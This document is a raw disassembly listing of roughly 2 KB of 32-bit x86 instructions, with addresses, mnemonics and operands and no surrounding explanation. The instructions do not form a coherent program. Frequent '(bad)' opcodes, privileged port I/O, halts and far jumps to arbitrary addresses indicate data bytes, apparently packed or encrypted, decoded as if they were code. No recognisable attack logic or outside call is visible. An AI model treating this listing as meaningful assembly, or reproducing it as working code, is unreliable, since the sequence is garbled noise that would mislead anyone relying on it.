  413e2b:	add    dl,ah
  413e2d:	add    al,0xc9
  413e2f:	add    cl,bh
  413e31:	cli    
  413e32:	mov    esi,0xc5afe8e0
  413e37:	in     al,0xee
  413e39:	mov    ebx,0xb5f4d1af
  413e3e:	mov    ebp,0xfdd2b8db
  413e43:	into   
  413e44:	cmc    
  413e45:	repnz (bad) 
  413e48:	ret    0xbfd2
  413e4b:	add    eax,0xc5eaedbd
  413e50:	(bad)
  413e53:	lock mul edx
  413e56:	repz icebp 
  413e58:	mov    bl,0xf0
  413e5a:	stc    
  413e5b:	fyl2x  
  413e5d:	mov    edx,0xcebddae4
  413e62:	rol    eax,0x0
  413e65:	(bad)  
  413e67:	repz ret 
  413e69:	fcmovnu st,st(3)
  413e6b:	loope  0x413e52
  413e6d:	rcr    bh,0xe1
  413e70:	in     eax,dx
  413e71:	add    esp,edi
  413e73:	(bad)  
  413e74:	mov    al,0xe3
  413e76:	aam    0xd7
  413e78:	jmp    0xd2f1f425
  413e7d:	mov    esi,0xd4f3f3d4
  413e82:	test   DWORD PTR [ecx],0xe0f4eebc
  413e88:	aam    0x4
  413e8a:	(bad)  
  413e8c:	shr    ebx,0x3
  413e8f:	loopne 0x413e79
  413e91:	add    edx,edx
  413e93:	lods   al,BYTE PTR ds:[esi]
  413e94:	retf   
  413e95:	lods   eax,DWORD PTR ds:[esi]
  413e96:	in     eax,0xe4
  413e98:	jmp    0x413e82
  413e9a:	idiv   DWORD PTR [ebx-0x21234926]
  413ea0:	(bad)  
  413ea1:	mov    ecx,0xf7fdf8df
  413ea6:	lock ret 0xe7c0
  413eaa:	icebp  
  413eab:	add    eax,0xfb05c8e5
  413eb0:	leave  
  413eb1:	or     al,0xcd
  413eb3:	loope  0x413e84
  413eb5:	ret    0xb3e8
  413eb8:	ret    0xafd5
  413ebb:	mov    al,0xf9
  413ebd:	xlat   BYTE PTR ds:[ebx]
  413ebe:	leave  
  413ebf:	cmc    
  413ec0:	rcr    ah,cl
  413ec2:	mov    bh,0xf1
  413ec4:	fcmovbe st,st(2)
  413ec6:	(bad)  
  413ec7:	fucom  st(0)
  413ec9:	ror    edx,1
  413ecb:	jmp    0xe0f2:0x1edffd8
  413ed2:	leave  
  413ed3:	mov    ebp,0xc4b0efd2
  413ed8:	jmp    0x413ebe
  413eda:	mul    ch
  413edc:	idiv   bh
  413ede:	aam    0xdc
  413ee0:	(bad)  
  413ee2:	fsincos 
  413ee4:	iret   
  413ee5:	jecxz  0x413ece
  413ee7:	(bad)  
  413ee8:	(bad)  
  413ee9:	out    0xd0,eax
  413eeb:	cmc    
  413eec:	cli    
  413eed:	push   cs
  413eee:	jmp    0xa74650fa
  413ef3:	scas   al,BYTE PTR es:[edi]
  413ef4:	mov    dl,0xf1
  413ef6:	in     eax,0xf4
  413ef8:	call   0xd53c15c9
  413efd:	call   0xbe20fdb6
  413f02:	sar    DWORD PTR [edi-0x131b0f09],cl
  413f08:	(bad)  
  413f09:	fucom  st(7)
  413f0b:	fmul   QWORD PTR [edi]
  413f0d:	loop   0x413efb
  413f0f:	add    cl,dl
  413f11:	into   
  413f12:	(bad)  
  413f14:	jmp    0xefe0:0xccdbdded
  413f1b:	mov    ecx,0xb2fbe5d2
  413f20:	mov    ecx,0xf0e8dde2
  413f25:	cmc    
  413f26:	in     al,dx
  413f27:	clc    
  413f28:	ret    0xca01
  413f2b:	loope  0x413f0f
  413f2d:	stc    
  413f2e:	std    
  413f2f:	cld    
  413f30:	sti    
  413f31:	enter  0xc9c0,0xeb
  413f35:	shr    bl,1
  413f37:	out    dx,al
  413f38:	mov    bh,0xe7
  413f3a:	mov    bl,0xee
  413f3c:	(bad)  [edi-0x152a1c0f]
  413f42:	shl    eax,cl
  413f44:	inc    ebx
  413f46:	(bad)  
  413f47:	fst    st(5)
  413f49:	aad    0xfe
  413f4b:	jmp    0xe3420025
  413f50:	(bad)  
  413f51:	(bad)  
  413f53:	fadd   st,st(7)
  413f55:	cmc    
  413f56:	jecxz  0x413f1a
  413f58:	(bad)  
  413f59:	shl    DWORD PTR [ebp-0xd343140],cl
  413f5f:	mov    esi,0xf7ecddba
  413f64:	mov    esp,0xdee5d6db
  413f69:	(bad)  
  413f6a:	or     bl,dl
  413f6c:	or     bl,bl
  413f6e:	jecxz  0x413f79
  413f70:	cld    
  413f71:	add    dh,al
  413f73:	repnz icebp 
  413f75:	mov    esi,0xd0b3dbdd
  413f7a:	out    dx,al
  413f7b:	iret   
  413f7c:	sti    
  413f7d:	into   
  413f7e:	(bad)  
  413f7f:	std    
  413f80:	mov    ebp,0xf6f6e2f8
  413f85:	shl    esp,cl
  413f87:	push   es
  413f88:	(bad)  
  413f89:	(bad)  
  413f8b:	lock or ebx,edx
  413f8e:	retf   
  413f8f:	(bad)  
  413f90:	in     al,dx
  413f91:	adc    edx,ecx
  413f93:	mov    edi,0xf2f2b2dc
  413f98:	enter  0xcdcb,0xf9
  413f9c:	leave  
  413f9d:	xlat   BYTE PTR ds:[ebx]
  413f9e:	div    ah
  413fa0:	call   0x13b0277
  413fa5:	clc    
  413fa6:	(bad)  
  413fa7:	rol    esp,1
  413fa9:	in     al,0xcb
  413fab:	out    dx,eax
  413fac:	out    0x5,eax
  413fae:	mov    dh,0x2
  413fb1:	loopne 0x413f7c
  413fb3:	retf   
  413fb4:	rol    dl,cl
  413fb6:	retf   0xf6b0
  413fb9:	jmp    0xbaf6fa82
  413fbe:	into   
  413fbf:	int3   
  413fc0:	repnz int3 
  413fc2:	xlat   BYTE PTR ds:[ebx]
  413fc3:	loopne 0x413fa3
  413fc5:	add    ebx,ebx
  413fc7:	fsubrp st(0),st
  413fc9:	jmp    0xfaed:0xe7c8c407
  413fd0:	add    ecx,ecx
  413fd2:	mov    bl,0xc8
  413fd4:	out    0xe2,eax
  413fd6:	hlt    
  413fd7:	jmp    0xd0f2:0xdbe9d4b5
  413fde:	into   
  413fdf:	in     eax,dx
  413fe0:	int3   
  413fe1:	shl    edx,cl
  413fe3:	(bad)  
  413fe5:	repnz cli 
  413fe7:	jmp    0x413fed
  413fe9:	shl    ebp,0xe6
  413fec:	stc    
  413fed:	or     edi,eax
  413fef:	fsubr  st(4),st
  413ff1:	int3   
  413ff2:	lods   eax,DWORD PTR ds:[esi]
  413ff3:	out    0xe8,al
  413ff5:	not    esi
  413ff7:	lods   al,BYTE PTR ds:[esi]
  413ff8:	aad    0xd2
  413ffa:	retf   0xe5c7
  413ffd:	jmp    0x413fc9
  413fff:	mov    dh,0xcc
  414001:	into   
  414002:	mov    edi,0xde03bff5
  414007:	(bad)  
  414008:	hlt    
  414009:	out    0xf9,eax
  41400b:	lds    ecx,FWORD PTR [edx]
  41400d:	retf   
  41400e:	in     al,0xfe
  414010:	or     dl,dl
  414012:	icebp  
  414013:	in     eax,0xc2
  414015:	ror    bl,cl
  414017:	mov    ch,0xc3
  414019:	aam    0xfb
  41401b:	iret   
  41401c:	in     eax,dx
  41401d:	(bad)  [ebp-0x3d0a0e18]
  414023:	mov    esp,0xdddee6fe
  414028:	fadd   st,st(0)
  41402a:	xlat   BYTE PTR ds:[ebx]
  41402b:	(bad)  
  41402c:	inc    BYTE PTR ds:0xeefbccdb
  414032:	iret   
  414033:	ret    0xeebe
  414036:	icebp  
  414037:	out    0xc5,al
  414039:	into   
  41403a:	retf   
  41403b:	jmp    0xd3000df9
  414040:	shl    ecx,1
  414042:	int    0xec
  414044:	shl    bl,cl
  414046:	(bad)  
  414048:	lock loope 0x414054
  41404b:	clc    
  41404c:	cli    
  41404d:	hlt    
  41404e:	psllq  mm1,QWORD PTR [ecx]
  414051:	psllw  mm3,mm4
  414054:	lock shl edi,cl
  414057:	imul   ebp
  414059:	shr    eax,cl
  41405b:	into   
  41405c:	neg    edx
  41405e:	out    dx,al
  41405f:	(bad)  
  414060:	clc    
  414061:	mov    ah,0xfe
  414063:	lock in al,dx
  414065:	shl    ebx,1
  414067:	add    al,0xd9
  414069:	hlt    
  41406a:	xlat   BYTE PTR ds:[ebx]
  41406b:	aam    0xe
  41406d:	in     eax,dx
  41406e:	add    cl,BYTE PTR [eax+edi*8]
  414071:	rcr    cl,cl
  414073:	mov    al,0xaf
  414075:	xlat   BYTE PTR ds:[ebx]
  414076:	int    0xe8
  414078:	retf   
  414079:	ret    0xdbc1
  41407c:	into   
  41407d:	call   0xd4fd3758
  414082:	iret   
  414083:	idiv   BYTE PTR [eax-0xd43333f]
  414089:	(bad)  
  41408b:	pop    es
  41408c:	stc    
  41408d:	cmc    
  41408e:	or     al,0xfb
  414090:	in     al,dx
  414091:	in     eax,dx
  414092:	(bad)  
  414093:	lods   eax,DWORD PTR ds:[esi]
  414094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414095:	shl    DWORD PTR [eax-0x5534438],0xd4
  41409c:	aam    0xba
  41409e:	mov    ch,0xf7
  4140a0:	idiv   DWORD PTR [ebx-0x3f46290a]
  4140a6:	std    
  4140a7:	aad    0xdb
  4140a9:	xlat   BYTE PTR ds:[ebx]
  4140aa:	ret    
  4140ab:	in     al,0xe7
  4140ad:	(bad)  
  4140ae:	std    
  4140af:	aam    0xe0
  4140b1:	out    dx,eax
  4140b2:	mov    bl,0xdf
  4140b4:	iret   
  4140b5:	mul    bh
  4140b7:	lods   al,BYTE PTR ds:[esi]
  4140b8:	sti    
  4140b9:	in     al,dx
  4140ba:	leave  
  4140bb:	xlat   BYTE PTR ds:[ebx]
  4140bc:	jmp    0x4140b0
  4140be:	in     eax,0xd5
  4140c0:	fcmovnu st,st(4)
  4140c2:	iret   
  4140c3:	repnz shl ch,cl
  4140c6:	sar    DWORD PTR [ebp-0x16fdfc2a],cl
  4140cc:	(bad)  
  4140ce:	hlt    
  4140cf:	or     eax,0xcfcd13c8
  4140d4:	leave  
  4140d5:	lock ret 0xc0ea
  4140d9:	fcmovnb st,st(5)
  4140db:	mov    dl,0xee
  4140dd:	repnz shl edx,cl
  4140e0:	mov    cl,0xf8
  4140e2:	fsubrp st(3),st
  4140e4:	clc    
  4140e5:	mul    ah
  4140e7:	rcr    esp,0xcb
  4140ea:	(bad)
  4140ee:	out    dx,eax
  4140ef:	retf   0xcecf
  4140f2:	test   al,0xcc
  4140f4:	loop   0x41409a
  4140f6:	(bad)  
  4140f7:	retf   0xf9b5
  4140fa:	not    ebx
  4140fc:	in     eax,dx
  4140fd:	mov    ch,0xd8
  4140ff:	(bad)  
  414100:	out    dx,al
  414101:	rcl    edi,1
  414103:	aad    0xee
  414105:	add    eax,0xd1f0f7df
  41410a:	add    bh,bl
  41410c:	enter  0xeac7,0xed
  414110:	enter  0xa8ff,0xef
  414114:	sar    DWORD PTR [ebp-0x182d520b],cl
  41411a:	in     al,dx
  41411b:	rcr    bh,cl
  41411d:	lock fxch st(1)
  414120:	ret    
  414121:	mov    al,0xd2
  414123:	mov    eax,0xebf5ccd9
  414128:	loope  0x4140fa
  41412a:	add    bh,bl
  41412c:	retf   
  41412d:	or     ebx,eax
  41412f:	fsubr  st(1),st
  414131:	icebp  
  414132:	(bad)
  414135:	icebp  
  414136:	retf   
  414137:	shl    BYTE PTR [esi-0x3a4f040b],0xed
  41413e:	in     al,0xe8
  414140:	not    ebx
  414142:	jecxz  0x414133
  414144:	add    bl,bl
  414146:	lock or eax,DWORD PTR [ebx]
  414149:	fstp   st(2)
  41414b:	add    DWORD PTR [ebp-0x5f414fe],edi
  414151:	add    al,0xd9
  414153:	out    0xc7,al
  414155:	ret    0xf2e2
  414158:	rcl    edi,1
  41415a:	fxch   st(3)
  41415c:	fnstcw WORD PTR [edi-0x260f3b0f]
  414162:	mov    bh,0xd8
  414164:	out    dx,al
  414165:	sar    bh,1
  414167:	frndint 
  414169:	rol    DWORD PTR [ebx],1
  41416b:	femms  
  41416d:	loop   0x414153
  41416f:	fisttp QWORD PTR [eax]
  414171:	add    al,0xc4
  414173:	in     al,dx
  414174:	scas   eax,DWORD PTR es:[edi]
  414175:	jmp    0x41413d
  414177:	repz in al,0xcf
  41417a:	out    dx,al
  41417b:	jmp    0xeffb:0xd5eccdcb
  414182:	std    
  414183:	sar    bl,1
  414185:	fdivr  QWORD PTR [edi+0x9e2c6e3]
  41418b:	lds    eax,FWORD PTR ds:0xe1df0edd
  414191:	fcomp  st(1)
  414193:	mov    cl,0xec
  414195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414196:	(bad)  
  414197:	mov    bh,0xf6
  414199:	in     al,dx
  41419a:	mov    ch,0xb4
  41419c:	(bad)  
  41419d:	rcl    edx,cl
  41419f:	(bad)  
  4141a1:	neg    esp
  4141a3:	add    edx,esi
  4141a5:	inc    BYTE PTR ds:0x405c1df
  4141ab:	(bad)  [ebx]
  4141ad:	out    0xd,eax
  4141af:	add    dh,ah
  4141b1:	std    
  4141b2:	mov    esi,0xc1bcbef7
  4141b7:	mov    cl,0xda
  4141b9:	iret   
  4141ba:	fidiv  DWORD PTR [ecx-0x2d2c362b]
  4141c0:	cmc    
  4141c1:	ret    
  4141c2:	(bad)  
  4141c3:	int3   
  4141c4:	repz icebp 
  4141c6:	push   es
  4141c7:	rol    DWORD PTR [ecx],0xe3
  4141ca:	or     edx,eax
  4141cc:	loope  0x4141a2
  4141ce:	fucomp st(0)
  4141d0:	iret   
  4141d1:	std    
  4141d2:	shl    ebx,1
  4141d4:	mov    cl,0xf5
  4141d6:	ror    esi,1
  4141d8:	out    dx,eax
  4141d9:	int3   
  4141da:	clc    
  4141db:	mov    eax,0xf6cad4fe
  4141e0:	fidivr WORD PTR [ebx-0x2290f09]
  4141e6:	clc    
  4141e7:	lds    eax,FWORD PTR [eax]
  4141e9:	add    DWORD PTR [eax],ecx
  4141eb:	dec    BYTE PTR [edx]
  4141ed:	inc    BYTE PTR [ebx+eiz*8]
  4141f0:	repnz stc 
  4141f2:	int    0xc1
  4141f4:	jmp    0x4141c9
  4141f6:	(bad)  
  4141f7:	ret    
  4141f8:	int3   
  4141f9:	shr    bh,0xc7
  4141fc:	out    dx,eax
  4141fd:	(bad)  
  4141fe:	clc    
  4141ff:	mov    eax,0xeedcb0f7
  414204:	push   es
  414205:	std    
  414206:	fst    st(7)
  414208:	ffreep st(5)
  41420a:	ror    BYTE PTR [ebx],1
  41420c:	in     al,0xe
  41420e:	jmp    ecx
  414210:	or     al,0xe3
  414212:	fucomp st(7)
  414214:	xlat   BYTE PTR ds:[ebx]
  414215:	mov    ebp,0xf2edd6e4
  41421a:	mov    ah,0xc9
  41421c:	out    0xf8,eax
  41421e:	in     eax,dx
  41421f:	(bad)  
  414220:	cld    
  414221:	enter  0xc8d9,0xfc
  414225:	pop    es
  414226:	(bad)  
  414227:	sti    
  414228:	repz jmp 0xefe6:0x708c4d1
  414230:	out    0xd,eax
  414232:	out    0xe2,eax
  414234:	into   
  414235:	jmp    0xbb0719e5
  41423a:	mov    al,0xee
  41423c:	jmp    0xe3fb2cf1
  414241:	mov    esp,0xe5f1fcd7
  414246:	int    0xd4
  414248:	ret    0xddd7
  41424b:	add    al,0xf5
  41424d:	std    
  41424e:	loopne 0x41423a
  414250:	jecxz  0x41421a
  414252:	mov    eax,0xdce4c2c5
  414257:	out    0xc5,al
  414259:	mov    dl,0xbb
  41425b:	out    0xce,al
  41425d:	rcl    dh,cl
  41425f:	mov    dl,0xfe
  414261:	call   0xdf0efd65
  414266:	loop   0x414259
  414268:	ret    0x1de
  41426b:	loope  0x41424d
  41426d:	jecxz  0x41426c
  41426f:	retf   
  414270:	pop    es
  414271:	add    esi,DWORD PTR [ebx-0x390d3157]
  414277:	lods   eax,DWORD PTR ds:[esi]
  414278:	rol    edi,cl
  41427a:	fdiv   st,st(2)
  41427c:	shr    ecx,1
  41427e:	les    esi,FWORD PTR [esi-0x310b092b]
  414284:	jecxz  0x414287
  414286:	mov    esi,0xbe6d2df
  41428b:	add    DWORD PTR [ebp-0x511fe44],edi
  414291:	leave  
  414292:	out    dx,eax
  414293:	jmp    0xb229ff64
  414298:	jmp    0x41425f
  41429a:	(bad)  
  41429b:	clc    
  41429c:	lods   eax,DWORD PTR ds:[esi]
  41429d:	std    
  41429e:	mov    dh,0xed
  4142a0:	iret   
  4142a1:	clc    
  4142a2:	repnz pop es
  4142a4:	mov    esp,0xbdf9ccf9
  4142a9:	(bad)  
  4142aa:	in     eax,0xf8
  4142ac:	fcmovbe st,st(6)
  4142ae:	(bad)  
  4142af:	fld    DWORD PTR [eax]
  4142b1:	jmp    0xca22eca9
  4142b6:	ret    0xd3b5
  4142b9:	fcmovnbe st,st(7)
  4142bb:	clc    
  4142bc:	in     eax,dx
  4142bd:	out    0xec,al
  4142bf:	mov    ah,0x2
  4142c1:	dec    ebp
  4142c3:	cli    
  4142c4:	out    0xf0,al
  4142c6:	pop    es
  4142c7:	add    eax,0xdd0a06e7
  4142cc:	jecxz  0x4142ac
  4142ce:	retf   
  4142cf:	vpaddsw ymm5,ymm3,YMMWORD PTR [ebx-0x3b113250]
  4142d7:	in     al,0xe9
  4142d9:	enter  0xd6e0,0xd6
  4142dd:	fnop   
  4142df:	fst    st(4)
  4142e1:	cmc    
  4142e2:	xlat   BYTE PTR ds:[ebx]
  4142e3:	loop   0x4142b3
  4142e5:	ret    0xd4e7
  4142e8:	fxam   
  4142ea:	sar    ecx,0xc1
  4142ed:	in     eax,dx
  4142ee:	jmp    0xc20e4bee
  4142f3:	out    dx,al
  4142f4:	shr    dl,cl
  4142f6:	shl    bl,cl
  4142f8:	cmc    
  4142f9:	ret    0xdfce
  4142fc:	mov    edx,0xf1dcb8d5
  414301:	mov    edx,0xcef207cc
  414306:	lock (bad) 
  414309:	rol    dl,cl
  41430b:	add    ebx,edi
  41430d:	retf   
  41430e:	add    al,0xe7
  414310:	in     eax,dx
  414311:	repz iret 
  414313:	loope  0x414304
  414315:	loope  0x4142f4
  414317:	retf   
  414318:	mov    dh,0xed
  41431a:	mov    edx,0xd4cdf0cc
  41431f:	frndint 
  414321:	mov    ecx,0xf2e0fcdd
  414326:	(bad)  
  414327:	fcmove st,st(3)
  414329:	(bad)  
  41432a:	aam    0xca
  41432c:	retf   
  41432d:	jmp    0xf4c31ff
  414332:	scas   eax,DWORD PTR es:[edi]
  414333:	enter  0xdcad,0xcf
  414337:	out    dx,al
  414338:	mov    dh,0xf5
  41433a:	lock rcr bl,cl
  41433d:	std    
  41433e:	into   
  41433f:	mov    ecx,0xeebab9b1
  414344:	mov    edi,0xe7e7f7fb
  414349:	sar    ebx,1
  41434b:	lds    eax,FWORD PTR [edx]
  41434d:	add    eax,ebp
  41434f:	loope  0x41435f
  414351:	clc    
  414352:	loop   0x41431f
  414354:	jmp    0xfc34084c
  414359:	lods   al,BYTE PTR ds:[esi]
  41435a:	out    0xc8,eax
  41435c:	cmc    
  41435d:	call   0xc019004e
  414362:	sar    BYTE PTR [ebp-0x423d2bfe],cl
  414368:	or     bl,dh
  41436a:	ret    0x8c9
  41436d:	add    ebx,edi
  41436f:	out    dx,al
  414370:	loope  0x414355
  414372:	jmp    0x414360
  414374:	fmulp  st(3),st
  414376:	loopne 0x414325
  414378:	(bad)  
  414379:	mov    al,0xc6
  41437b:	lock out 0xc4,eax
  41437e:	lock add ebp,eax
  414381:	std    
  414382:	jecxz  0x41436c
  414384:	fiadd  DWORD PTR [ebx]
  414386:	add    esi,edi
  414388:	pop    es
  414389:	fld    st(1)
  41438b:	not    ebp
  41438d:	leave  
  41438e:	(bad)  
  41438f:	jmp    0xd3e8459c
  414394:	test   eax,0xfab1dce8
  414399:	in     eax,0xd8
  41439b:	in     eax,dx
  41439c:	repz enter 0xf2f2,0xd4
  4143a1:	mov    ebx,0xfcbf02d0
  4143a6:	in     al,dx
  4143a7:	clc    
  4143a8:	lock loopne 0x4143b4
  4143ab:	fucomp st(7)
  4143ad:	out    dx,al
  4143ae:	or     al,0xea
  4143b0:	bswap  ebp
  4143b2:	ret    0xacc2
  4143b5:	iret   
  4143b6:	out    0xca,eax
  4143b8:	mov    bl,0xbb
  4143ba:	mov    bh,0xc4
  4143bc:	int3   
  4143bd:	mov    ah,0xcb
  4143bf:	(bad)  
  4143c0:	sar    bl,1
  4143c2:	xlat   BYTE PTR ds:[ebx]
  4143c3:	out    dx,eax
  4143c4:	mov    edi,0x3d0f3e7
  4143c9:	aam    0xf0
  4143cb:	out    0xc6,al
  4143cd:	std    
  4143ce:	out    0x8,eax
  4143d0:	repnz (bad) 
  4143d2:	in     al,0xce
  4143d4:	in     eax,0xc1
  4143d6:	shl    bh,1
  4143d8:	ror    bh,1
  4143da:	enter  0xb5c6,0xbe
  4143de:	xlat   BYTE PTR ds:[ebx]
  4143df:	retf   
  4143e0:	mov    edi,0xdcc8dde2
  4143e5:	aam    0xd0
  4143e7:	add    eax,DWORD PTR [ebx]
  4143e9:	cli    
  4143ea:	leave  
  4143eb:	loope  0x4143c5
  4143ed:	push   cs
  4143ee:	std    
  4143ef:	add    DWORD PTR [ebx],ecx
  4143f1:	jmp    0x4143ba
  4143f3:	mov    esi,0xe5ace7c2
  4143f8:	jmp    0x4143e1
  4143fa:	shl    DWORD PTR [eax-0x2e440038],cl
  414400:	xlat   BYTE PTR ds:[ebx]
  414401:	mov    ah,0xee
  414403:	out    dx,eax
  414404:	loopne 0x4143d9
  414406:	int3   
  414407:	add    al,0xc6
  414409:	ret    0xbeeb
  41440c:	stc    
  41440d:	push   es
  41440e:	clc    
  41440f:	call   0xf3eb08f4
  414414:	test   eax,0xecc1d6dd
  414419:	mov    al,0xdb
  41441b:	icebp  
  41441c:	jmp    0x4143e2
  41441e:	rcr    ch,1
  414420:	cli    
  414421:	ret    0xe8f3
  414424:	idiv   DWORD PTR [edi-0x1b2b22fc]
  41442a:	xlat   BYTE PTR ds:[ebx]
  41442b:	add    bl,cl
  41442d:	(bad)  
  41442e:	fcos   
  414430:	leave  
  414431:	stc    
  414432:	iret   
  414433:	in     al,dx
  414434:	loop   0x41441e
  414436:	loop   0x414413
  414438:	out    dx,eax
  414439:	in     al,0xb7
  41443b:	mov    edx,0xeedbb8f3
  414440:	enter  0xfdd3,0xbd
  414444:	shl    bl,0xe1
  414447:	out    0xe2,al
  414449:	mov    ebx,0xc40bf4e6
  41444f:	repz loope 0x41443d
  414452:	rcl    edi,1
  414454:	int3   
  414455:	iret   
  414456:	lock rol bl,cl
  414459:	lods   al,BYTE PTR ds:[esi]
  41445a:	fadd   st,st(0)
  41445c:	mov    ch,0xda
  41445e:	cli    
  41445f:	in     eax,dx
  414460:	mov    ebx,0xc2defcd9
  414465:	loopne 0x414460
  414467:	add    eax,DWORD PTR [edi]
  414469:	fild   DWORD PTR [ebx]
  41446b:	jmp    0x41444c
  41446d:	inc    BYTE PTR [edi]
  41446f:	or     cl,dl
  414471:	fdivr  QWORD PTR [edi-0x140e1d1a]
  414477:	mov    bh,0xeb
  414479:	div    ebx
  41447b:	icebp  
  41447c:	jmp    0xfc1a0a66
  414481:	ror    esp,cl
  414483:	add    dh,dl
  414485:	fadd   DWORD PTR [ebx]
  414487:	shl    eax,0xf0
  41448a:	clc    
  41448b:	sti    
  41448c:	out    0xe0,eax
  41448e:	psubd  mm7,mm3
  414491:	leave  
  414492:	in     eax,0xf0
  414494:	retf   0xaddd
  414497:	lods   al,BYTE PTR ds:[esi]
  414498:	jmp    0xcb1d2550
  41449d:	repz jmp 0x41448f
  4144a0:	fcmove st,st(6)
  4144a2:	mov    edi,0xdfbdccb6
  4144a7:	rol    DWORD PTR [edx],cl
  4144a9:	retf   
  4144aa:	in     eax,0xf9
  4144ac:	clc    
  4144ad:	rol    dh,0xcc
  4144b0:	sti    
  4144b1:	call   0xc3ef2a60
  4144b6:	out    0xc2,eax
  4144b8:	shl    cl,1
  4144ba:	cmc    
  4144bb:	fstp   TBYTE PTR [edx-0x43241637]
  4144c1:	out    dx,eax
  4144c2:	ror    esi,cl
  4144c4:	cld    
  4144c5:	out    dx,al
  4144c6:	push   es
  4144c7:	cli    
  4144c8:	fdivp  st(5),st
  4144ca:	(bad)  
  4144cb:	(bad)  
  4144cc:	jmp    0x4144d9
  4144ce:	loop   0x41449b
  4144d0:	loopne 0x41449e
  4144d2:	int    0xa8
  4144d4:	int3   
  4144d5:	scas   al,BYTE PTR es:[edi]
  4144d6:	cmc    
  4144d7:	rol    edi,1
  4144d9:	fcmovnu st,st(2)
  4144db:	mov    dl,0xd6
  4144dd:	out    dx,eax
  4144de:	into   
  4144df:	stc    
  4144e0:	mov    edi,0xbdd2fcca
  4144e5:	aad    0xc2
  4144e7:	add    DWORD PTR [edx],eax
  4144e9:	(bad)  
  4144eb:	jmp    0xc9fe:0xf8cbfac1
  4144f2:	jmp    0xcc2427d5
  4144f7:	loopne 0x4144da
  4144f9:	(bad)  
  4144fc:	jmp    ebp
  4144fe:	iret   
  4144ff:	mov    eax,0xe8ccf0be
  414504:	fcomp  st(2)
  414506:	(bad)  
  414508:	or     eax,DWORD PTR ds:0xf501e3c5
  41450e:	(bad)  
  41450f:	call   0xf7f01117
  414514:	loopne 0x4144d4
  414516:	(bad)  
  414518:	mov    ch,0xe4
  41451b:	out    0xf1,al
  41451d:	out    dx,eax
  41451e:	out    dx,eax
  41451f:	sar    esp,1
  414521:	mov    ebx,0xdde2f6fa
  414526:	fxch   st(4)
  414528:	(bad)  
  41452b:	fsubr  st(7),st
  41452d:	retf   
  41452e:	(bad)  
  41452f:	or     eax,0xcec30607
  414534:	ffree  st(7)
  414536:	fdiv   QWORD PTR [ecx+esi*8-0x394e280f]
  41453d:	xlat   BYTE PTR ds:[ebx]
  41453e:	rcr    ebx,cl
  414540:	call   ebp
  414542:	(bad)  
  414543:	mov    ecx,0xc0f1f8c2
  414548:	hlt    
  414549:	jmp    0xfa020e18
  41454e:	out    dx,eax
  41454f:	aam    0x0
  414551:	in     al,dx
  414552:	(bad)  
  414554:	mov    edi,0xb4aee7f0
  414559:	mov    al,0xe6
  41455b:	out    0xbf,al
  41455d:	(bad)  
  41455e:	retf   0xf9ea
  414561:	mov    al,0xe8
  414563:	aad    0xb9
  414565:	loope  0x41456b
  414567:	rcl    esi,cl
  414569:	add    edx,ebx
  41456b:	pop    es
  41456c:	enter  0xca,0xdd
  414570:	or     ecx,DWORD PTR [edx]
  414572:	mov    ecx,0xabe2cfe8
  414577:	mov    ch,0xe4
  414579:	ror    eax,cl
  41457b:	stc    
  41457c:	int    0xee
  41457e:	cli    
  41457f:	fcomip st,st(3)
  414581:	retf   0xeef5
  414584:	cli    
  414585:	loopne 0x41458e
  414587:	(bad)  
  414588:	cmc    
  414589:	rol    BYTE PTR ds:0x50fc105,0xc6
  414590:	ror    edx,cl
  414592:	enter  0xa8e5,0xf6
  414596:	call   0xf634297e
  41459b:	in     eax,0xff
  41459d:	out    0xcf,al
  41459f:	fbstp  TBYTE PTR [ebp-0x124703]
  4145a5:	cmc    
  4145a6:	int3   
  4145a7:	fcmovnbe st,st(3)
  4145a9:	fimul  DWORD PTR [ebx]
  4145ab:	(bad)  
  4145ad:	(bad)
  4145b0:	in     al,dx
  4145b1:	or     dh,cl
  4145b3:	(bad)  
  4145b4:	repnz mov esp,0xf3cceded
  4145ba:	retf   0xe8f3
  4145bd:	mov    eax,0xcdd4bcc5
  4145c2:	rcr    ch,cl
  4145c4:	ret    
  4145c5:	in     eax,dx
  4145c6:	sti    
  4145c7:	loope  0x4145cc
  4145c9:	out    0xc2,eax
  4145cb:	sti    
  4145cc:	out    dx,eax
  4145cd:	jmp    0x31b399a
  4145d2:	shr    BYTE PTR [edx-0x551b2310],0xbb
  4145d9:	mov    dh,0xb1
  4145db:	out    0xef,al
  4145dd:	cmc    
  4145de:	retf   0xfab4
  4145e1:	out    dx,al
  4145e2:	fnstsw WORD PTR [esi-0x1a05fcfd]
  4145e8:	mov    esp,0xf4ddc5e9
  4145ed:	or     ah,ch
  4145ef:	adc    edi,edx
  4145f1:	sar    DWORD PTR [eax-0x13113f3c],cl
  4145f7:	repnz aam 0xe2
  4145fa:	int    0xb8
  4145fc:	fcmovnu st,st(3)
  4145fe:	xlat   BYTE PTR ds:[ebx]
  4145ff:	repnz mov ebx,0xdcd7d4c9
  414605:	fdivrp st(4),st
  414607:	fiadd  DWORD PTR [eax]
  414609:	loope  0x4145ff
  41460b:	hlt    
  41460c:	leave  
  41460d:	fxch   st(7)
  41460f:	or     ebp,ecx
  414611:	shl    BYTE PTR [edx-0x301b1538],cl
  414617:	(bad)
  41461a:	mov    dl,0xf1
  41461c:	mov    al,0xe4
  41461e:	mov    ebp,0xe0c2b5cb
  414623:	rcl    bl,cl
  414625:	add    esp,edx
  414627:	in     al,dx
  414628:	loope  0x4145fc
  41462a:	sar    ebp,0x0
  41462d:	pop    es
  41462e:	(bad)  
  41462f:	fdiv   st(1),st
  414631:	pop    es
  414632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414633:	(bad)
  414636:	retf   
  414637:	(bad)  
  414638:	test   eax,0xdacdf3d0
  41463d:	dec    cl
  41463f:	hlt    
  414640:	retf   
  414641:	out    dx,al
  414642:	aad    0xda
  414644:	shl    esp,1
  414646:	div    edx
  414648:	add    bl,cl
  41464a:	add    eax,ecx
  41464c:	stc    
  41464d:	push   cs
  41464e:	cli    
  41464f:	leave  
  414650:	or     BYTE PTR [ecx],al
  414652:	shr    BYTE PTR [ecx-0xc1c3129],cl
  414658:	repz int3 
  41465a:	mov    ebx,0xcdccb0d1
  41465f:	mov    ecx,0xefcdbccb
  414664:	loop   0x414637
  414666:	mov    DWORD PTR [edx],0xf8ebebd5
  41466c:	out    dx,eax
  41466d:	stc    
  41466e:	(bad)  
  414670:	or     eax,0xc0eecdfa
  414675:	call   0xe1100e4c
  41467a:	lock aam 0xd5
  41467d:	call   0xbc2a4151
  414682:	(bad)  
